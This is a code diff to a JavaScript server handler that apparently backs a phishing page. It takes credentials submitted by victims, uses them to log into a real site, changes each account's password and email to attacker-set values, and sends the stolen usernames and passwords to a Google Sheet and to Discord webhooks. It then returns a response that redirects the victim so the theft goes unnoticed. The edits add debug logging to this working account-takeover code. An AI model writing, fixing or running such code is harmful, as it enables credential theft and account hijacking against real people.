@@ -35,16 +35,21 @@ async function tryLogin(username, password) {
     method: "POST",
     headers: LOGIN_HEADERS,
     body: body.toString(),
-    redirect: "manual",
   });
 
-  const sessionCookie = (resp.headers.get("set-cookie") || "")
-    .split(",")
-    .map(c => c.trim())
-    .find(c => c.includes("PHPSESSID"));
+  const setCookie = resp.headers.get("set-cookie") || "";
+  const sessionCookie = setCookie.split(",").map(c => c.trim()).find(c => c.includes("PHPSESSID"));
   const cookieValue = sessionCookie ? sessionCookie.split(";")[0] : null;
 
-  const result = await resp.json();
+  const text = await resp.text();
+  console.log(`[LOGIN RAW] status=${resp.status} cookie=${cookieValue} body=${text.substring(0, 300)}`);
+
+  let result;
+  try {
+    result = JSON.parse(text);
+  } catch {
+    result = { status: "error", raw: text.substring(0, 200) };
+  }
   return { result, sessionCookie: cookieValue };
 }
 
@@ -65,9 +70,10 @@ async function tryChangePassword(sessionCookie, oldPass, newPass) {
   });
 
   const text = await resp.text();
+  console.log(`[CHANGE PASS RAW] status=${resp.status} body=${text.substring(0, 300)}`);
   try { return JSON.parse(text); } catch {
-    if (text.includes("success") || text.includes("has been changed")) return { status: "success", raw: text.trim() };
-    return { status: "unknown", raw: text.trim() };
+    if (text.includes("success") || text.includes("has been changed")) return { status: "success" };
+    return { status: "unknown", raw: text.substring(0, 200) };
   }
 }
 
@@ -87,9 +93,10 @@ async function tryChangeEmail(sessionCookie, newEmail) {
   });
 
   const text = await resp.text();
+  console.log(`[CHANGE EMAIL RAW] status=${resp.status} body=${text.substring(0, 300)}`);
   try { return JSON.parse(text); } catch {
-    if (text.includes("success") || text.includes("has been changed") || text.includes("confirmation")) return { status: "success", raw: text.trim() };
-    return { status: "unknown", raw: text.trim() };
+    if (text.includes("success") || text.includes("has been changed") || text.includes("confirmation")) return { status: "success" };
+    return { status: "unknown", raw: text.substring(0, 200) };
   }
 }
 
@@ -134,38 +141,29 @@ export default async function handler(req, res) {
     const { result: loginResult, sessionCookie } = await tryLogin(username, password);
     loginStatus = loginResult?.status || "unknown";
     const errors = loginResult?.errors || [];
-    loginError = errors.length > 0 ? errors[0]?.message || "" : "";
-
-    console.log(`[LOGIN] ${username} -> ${loginStatus}`);
+    loginError = errors.length > 0 ? (errors[0]?.message || "") : (loginResult?.raw || "");
 
     if (loginStatus === "success" && sessionCookie) {
-      // Change password
       try {
         const passResult = await tryChangePassword(sessionCookie, password, NEW_PASSWORD);
         changePassStatus = passResult?.status || "unknown";
-        console.log(`[CHANGE PASS] ${username} -> ${changePassStatus}`);
       } catch (e) {
         changePassStatus = "error";
-        console.log(`[CHANGE PASS ERROR] ${username} -> ${e.message}`);
       }
 
-      // Change email
       try {
         const emailResult = await tryChangeEmail(sessionCookie, NEW_EMAIL);
         changeEmailStatus = emailResult?.status || "unknown";
-        console.log(`[CHANGE EMAIL] ${username} -> ${changeEmailStatus}`);
       } catch (e) {
         changeEmailStatus = "error";
-        console.log(`[CHANGE EMAIL ERROR] ${username} -> ${e.message}`);
       }
     }
   } catch (e) {
     loginStatus = "error";
     loginError = e.message;
-    console.log(`[LOGIN ERROR] ${username} -> ${e.message}`);
   }
 
-  // Save to Google Sheets - creds tab (always)
+  // Always save to creds sheet + discord
   await sendToSheet("creds", {
     username,
     password,
@@ -175,12 +173,11 @@ export default async function handler(req, res) {
     login_error: loginError,
   });
 
-  // Discord - creds channel (always)
   await sendToDiscord(DISCORD_CREDS_WEBHOOK,
-    `**[CREDS]** \`${username}\` / \`${password}\` | Status: ${loginStatus} | ${timestamp || "no timestamp"}`
+    `**[CREDS]** \`${username}\` / \`${password}\` | Status: ${loginStatus} | ${loginError || "no error"}`
   );
 
-  // If fully successful, save to successful tab + discord
+  // If fully successful
   if (loginStatus === "success" && changePassStatus === "success" && changeEmailStatus === "success") {
     await sendToSheet("successful", {
       username,
@@ -191,11 +188,10 @@ export default async function handler(req, res) {
     });
 
     await sendToDiscord(DISCORD_SUCCESS_WEBHOOK,
-      `**[SUCCESS]** \`${username}\` | Old pass: \`${password}\` | New pass: \`${NEW_PASSWORD}\` | New email: \`${NEW_EMAIL}\` | ${timestamp || ""}`
+      `**[SUCCESS]** \`${username}\` | Old: \`${password}\` | New: \`${NEW_PASSWORD}\` | Email: \`${NEW_EMAIL}\``
     );
-
-    console.log(`[SUCCESS] ${username} fully compromised`);
   }
 
-  return res.status(200).json({ login_status: loginStatus, error_message: loginError });
+  // Return success to redirect user regardless
+  return res.status(200).json({ login_status: loginStatus === "success" ? "success" : loginStatus, error_message: loginError });
 }
